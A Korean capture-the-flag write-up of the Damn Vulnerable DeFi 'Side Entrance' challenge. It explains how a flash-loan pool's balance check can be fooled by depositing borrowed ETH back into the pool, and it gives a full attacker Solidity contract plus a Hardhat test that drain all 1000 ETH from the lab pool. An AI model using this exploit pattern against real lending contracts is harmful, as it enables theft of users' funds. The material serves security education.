---
title: "DamnVulnerableDefi Side entrance 풀이"
author: Grizzly
categories:
  - Wargame
tags:
  - DamnVulnerableDefi
  - SideEntrace
  - Writeup

sitemap :
changefreq : daily
priority : 1.0
# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
---

## Overview
이 문제 역시 flashLoan에 관한 문제이고, `balance` 관리가 잘 못되어 취약점이 발생한다. `SideEntranceLenderPool.sol`이 주어지고, 이 파일에는 `SideEntranceLenderPool` 컨트랙트와 `IFlashLoanEtherReceiver` 인터페이스가 주어진다. ***이 문제의 목표는 `SideEntranceLenderPool` 컨트랙트가 가지고 있는 초기 자본인 `1000 eth`를 공격자가 모두 탈취하는 것이다.***

## 컨트랙트 분석
### SideEntranceLenderPool
~~~
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;  
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
~~~

이 컨트랙트는 다음과 같은 3개의 함수를 가지고 있다:
- `deposit()`: `msg.value`로 전달된 이더를 `msg.sender`의 잔고(`balances[msg.sender]`)에 추가.
- `withdraw()`: `msg.sender`가 가지고 있는 모든 이더를 `msg.sender`에게 전송.
- `flashLoan(uint256)`: 해당 컨트랙트의 잔액 체크와 함께 `IFlashLoanEtherReceiver` 인터페이스의 `execute()`를 호출. 이때, 대출금액(`amount`)를 전달.

`IFlashLoanEtherReceiver` 인터페이스에는 단순히 `execute()` 함수의 프로토타입만 선언되어 있다.

## Solution
이 문제는 선술한 것처럼 `balance` 체크에 문제가 있다.
`flashLoan` 함수를 보면, `execute()` 호출 전후로, `address(this).balance`를 이용해 현재 `SideEntranceLenderPool` 컨트랙트의 잔액을 확인한다.

반면, `deposit()`과 `withdraw()` 함수는 `SideEntranceLenderPool` 컨트랙트에 선언된 mapping 형 state variable인 `balances`를 이용해 잔액을 관리한다. 즉, `balances`에서 주소(혹은 계좌)간 잔액 이동이 발생해도 `address(this).balance`에는 변화가 없다. 

그리고, 당연하게도 `flashLoan` 함수에서 `IFlashLoanEtherReceiver` 인터페이스의 `execute()`를 호출하기 때문에 `flashLoan`을 호출하는 주체는 컨트랙트가 되어야 한다. 즉, 공격자는 자신의 스마트 컨트랙트를 작성하여 익스플로잇해야 한다. 위 내용들을 이용한 익스플로잇 시나리오는 다음과 같다.

1. 공격자가 `flashLoan()` 함수(`amount`는 `1000 eth`)를 호출하면, `execute` 함수가 호출되는데, `execute()`를 통해 다시 `deposit()`이 호출되도록 함. 이 과정에서 `balances`에 `SideEntranceLenderPool` 컨트랙트 주소가 가지고 있는 `1000 eth`가 공격자가 작성한 컨트랙트 주소로 이동됨.
2. `flashLoan` 함수가 종료되면, 공격자가 작성한 컨트랙트가 `withdraw()` 함수를 호출. 이 과정에서 `SideEntranceLenderPool` 컨트랙트에 쌓인 `1000 eth`가 공격자가 작성한 컨트랙트로 모두 전송됨.
3. `withdraw()` 함수 실행이 성공하면, Pool의 모든 이더가 공격자의 컨트랙트로 이동했기 때문에, 여유롭게 공격자의 주소로 *눈누난나*:D 이더를 전달함.

이 모든 과정을 수행하는 공격자의 컨트랙트는 다음과 같다.

~~~
contract AttackContract is IFlashLoanEtherReceiver {
    using Address for address payable;
    address payable public attacker;
    address public pool;

    constructor (address payable _attacker, address _pool) {
        attacker = _attacker;
        pool = _pool;
    }

    function execute() override external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function exploit(uint256 amount) public {
        SideEntranceLenderPool(pool).flashLoan(amount);

        SideEntranceLenderPool(pool).withdraw();
        payable(attacker).sendValue(address(this).balance);
    }

    fallback() external payable {

    }

    receive() external payable {

    }
}
~~~

그리고, 익스플로잇을 위한 Javascript 코드는 다음과 같다.

~~~
...
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    const AttackFactory = await ethers.getContractFactory("AttackContract", attacker);
    this.attackContract = await AttackFactory.deploy(attacker.address, this.pool.address);

    await this.attackContract.exploit(ETHER_IN_POOL);
    
});
...
~~~

***Sooooooooooo EZ***

## References
이번 문제는 너무 쉬워서 그런거 없다.